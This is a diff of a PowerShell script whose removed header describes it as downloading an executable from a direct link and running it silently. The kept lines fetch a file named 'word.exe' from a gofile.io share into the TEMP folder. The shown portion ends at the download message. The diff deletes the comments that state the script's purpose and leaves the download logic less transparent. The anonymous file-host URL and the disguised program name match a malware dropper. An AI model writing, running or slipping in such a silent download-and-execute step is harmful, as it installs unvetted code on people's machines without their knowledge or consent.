@@ -1,14 +1,6 @@
-# ============================================================
-#  Download-And-Run.ps1
-#  Downloads a .exe from a direct link and runs it silently.
-# ============================================================
-
-# --- CONFIGURE THESE ---
 $DownloadUrl = "https://store10.gofile.io/download/web/c9b59620-888c-4958-af5c-2aa606264fc9/word.exe"
 $ExeName     = "word.exe"
-$Arguments   = ""   # CLI args to pass (leave empty if none)
-# -----------------------
-
+$Arguments   = ""
 $DestPath = Join-Path $env:TEMP $ExeName
 
 Write-Host "Downloading $ExeName..."
